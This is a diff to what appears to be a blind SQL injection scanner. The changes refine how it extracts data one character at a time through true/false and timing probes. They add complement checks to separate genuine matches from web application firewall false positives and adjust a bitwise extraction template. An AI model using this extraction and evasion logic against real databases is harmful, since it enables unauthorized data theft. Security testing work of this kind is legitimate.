@@ -63803,49 +63803,96 @@ class Scanner:
                         if _fe_seen_false:
                             # Use last confirmed WAF-safe False value as complement
                             _complement_val = _fe_seen_false[-1]
+                            _comp_cond = f"({_ae})={_complement_val}"
+                            _comp_r = await _eval(_comp_cond)
+                            if _comp_r is True:
+                                # Complement from _fe_seen_false (WAF-safe) also True \u2192
+                                # WAF now uniformly blocks even previously-safe ordinals \u2192
+                                # genuine WAF-uniform state. Abort.
+                                LOG.warning(
+                                    "[Inference] pos=%d equality: match val=%d returned True "
+                                    "AND WAF-safe complement val=%d ALSO True \u2014 WAF-uniform "
+                                    "blocking confirmed for equality probes; aborting scan.",
+                                    p, _val, _complement_val)
+                                return None
+                            # RC8-EXT FIX (CRITICAL): When complement probe returns None,
+                            # we cannot distinguish a genuine True match from WAF-uniform blocking.
+                            # Defer to the ambiguous list; the single-ambiguous resolution path
+                            # returns the character when it is the only ambiguous value.
+                            if _comp_r is None:
+                                LOG.debug(
+                                    "[Inference] pos=%d equality: match val=%d but complement "
+                                    "(val=%d) returned None \u2014 deferring to ambiguous list "
+                                    "(cannot confirm without complement=False).",
+                                    p, _val, _complement_val)
+                                _fe_ambiguous.append(_val)
+                                continue
+                            LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
+                            return chr(_val)
                         else:
-                            # No WAF-safe values yet \u2014 use ordinal 0 (always SQL-False
-                            # for printable chars and unlikely to be WAF-blocked)
-                            _complement_val = 0
-                        _comp_cond = f"({_ae})={_complement_val}"
-                        _comp_r = await _eval(_comp_cond)
-                        if _comp_r is True:
-                            # Complement from _fe_seen_false (WAF-safe) also True \u2192
-                            # WAF now uniformly blocks even previously-safe ordinals \u2192
-                            # genuine WAF-uniform state. Abort.
-                            # (If complement was ordinal 0 fallback and also True \u2192
-                            # WAF blocks everything including =0 \u2192 also WAF-uniform.)
-                            LOG.warning(
-                                "[Inference] pos=%d equality: match val=%d returned True "
-                                "AND WAF-safe complement val=%d ALSO True \u2014 WAF-uniform "
-                                "blocking confirmed for equality probes; aborting scan.",
-                                p, _val, _complement_val)
-                            return None
-                        # RC8-EXT FIX (CRITICAL): When complement probe returns None,
-                        # we cannot distinguish a genuine True match from WAF-uniform blocking
-                        # regardless of _fe_seen_false state.
-                        #
-                        # Old behaviour: when _fe_seen_false was non-empty the None-complement
-                        # branch was skipped, falling through to `return chr(_val)` \u2014 accepting
-                        # the candidate with zero complement confirmation.  This produced runs
-                        # of 'a' and 'b' (first chars in the frequency-ordered scan list) for
-                        # every noisy position, because both have near-threshold timing and
-                        # their complement probes time out to None under load.
-                        #
-                        # Fix: defer to the ambiguous list whenever _comp_r is None, regardless
-                        # of _fe_seen_false.  The single-ambiguous resolution path at the end
-                        # of the scan returns the character when it is the only ambiguous value
-                        # (all others returned False).  Multiple ambiguous values \u2192 abort.
-                        if _comp_r is None:
-                            LOG.debug(
-                                "[Inference] pos=%d equality: match val=%d but complement "
-                                "(val=%d) returned None \u2014 deferring to ambiguous list "
-                                "(cannot confirm without complement=False).",
-                                p, _val, _complement_val)
-                            _fe_ambiguous.append(_val)
-                            continue
-                        LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
-                        return chr(_val)
+                            # RC9-FIX (CRITICAL): No WAF-safe False values seen yet.
+                            # The original code used a single ordinal-0 complement.
+                            # Failure mode: WAFs that selectively block nonzero ordinal
+                            # equality probes (`({expr})=97`, `({expr})=98`, etc.) while
+                            # passing `({expr})=0` produce a systematic false positive:
+                            #   probe `=97` ('a') \u2192 WAF-blocked \u2192 True (false positive)
+                            #   complement `=0`   \u2192 WAF passes \u2192 SQL-False \u2192 False
+                            # \u2192 `_comp_r is False` \u2192 return 'a' for every position.
+                            # Observed: extracts 'aaaabaaaaaaaabbaaaaaaaaa' (all a/b garbage).
+                            #
+                            # Fix: two-step complement check.
+                            # Step 1: ordinal 0 (zero \u2014 WAF rarely blocks `=0`).
+                            # Step 2: ordinal 1 (smallest nonzero \u2014 WAF blocks if it blocks
+                            #         all nonzero ordinals; passes if WAF is ordinal-specific).
+                            # Decision matrix:
+                            #   =0 True          \u2192 WAF uniform (blocks even 0) \u2192 abort
+                            #   =0 None          \u2192 defer to ambiguous
+                            #   =0 False, =1 True  \u2192 WAF blocks nonzero ordinals \u2192
+                            #                       original True was WAF FP \u2192 abort scan
+                            #   =0 False, =1 None  \u2192 defer to ambiguous (cannot confirm)
+                            #   =0 False, =1 False \u2192 both False \u2192 genuine True \u2192 return
+                            _comp0_r = await _eval(f"({_ae})=0")
+                            if _comp0_r is True:
+                                LOG.warning(
+                                    "[Inference] pos=%d equality: match val=%d True AND "
+                                    "ordinal-0 complement ALSO True \u2014 WAF-uniform blocking "
+                                    "(blocks even =0); aborting scan.", p, _val)
+                                return None
+                            if _comp0_r is None:
+                                LOG.debug(
+                                    "[Inference] pos=%d equality: match val=%d but ordinal-0 "
+                                    "complement returned None \u2014 deferring to ambiguous list.",
+                                    p, _val)
+                                _fe_ambiguous.append(_val)
+                                continue
+                            # ordinal 0 returned False (WAF-safe for zero comparisons).
+                            # Now verify ordinal 1 (nonzero) is ALSO False.
+                            # A WAF that blocks nonzero ordinal equality probes will block
+                            # =1 just as it blocked =_val, but passes =0 (zero special-case).
+                            _comp1_r = await _eval(f"({_ae})=1")
+                            if _comp1_r is True:
+                                # ordinal 0 False but ordinal 1 True \u2192 WAF selectively
+                                # blocks nonzero ordinal equality comparisons. The original
+                                # True for _val was a WAF false positive, not SQL-True.
+                                # This produces 'aaa...bbb' garbage (frequency-order FPs).
+                                LOG.warning(
+                                    "[Inference] pos=%d equality WAF-nonzero-block: "
+                                    "ordinal 0\u2192False but ordinal 1\u2192True. val=%d True was a "
+                                    "WAF false positive (WAF blocks nonzero equality probes). "
+                                    "Aborting equality scan to prevent 'aabb' garbage.",
+                                    p, _val)
+                                return None
+                            if _comp1_r is None:
+                                LOG.debug(
+                                    "[Inference] pos=%d equality: match val=%d, ordinal-0 "
+                                    "False but ordinal-1 complement None \u2014 deferring to "
+                                    "ambiguous list.", p, _val)
+                                _fe_ambiguous.append(_val)
+                                continue
+                            # Both ordinal 0 and ordinal 1 returned False \u2192 the WAF is not
+                            # uniformly blocking nonzero ordinals. Original True is genuine.
+                            LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
+                            return chr(_val)
                     # RC8-FIX: record this value as WAF-safe, SQL-False for complement reuse
                     _fe_seen_false.append(_val)
                     await asyncio.sleep(max(0.05, _fe_rtt_s * 0.3))  # BUG-FALLBACK-EQ-SLEEP-PERF FIX: was _delay * 0.3
@@ -168929,7 +168976,7 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
     # True/None → WAF selectively blocks `data_fn&8=8` patterns → abort.
     # False     → safe to proceed.
     try:
-        _lit_ascii_fn = ascii_tmpl.format(q="'a'", p=1)
+        _lit_ascii_fn = ascii_tmpl.format(q="(SELECT 'a')", p=1)
         if dbms == "Oracle":
             _rc6_cond = f"BITAND({_lit_ascii_fn},8)=8"
         elif dbms == "Firebird":
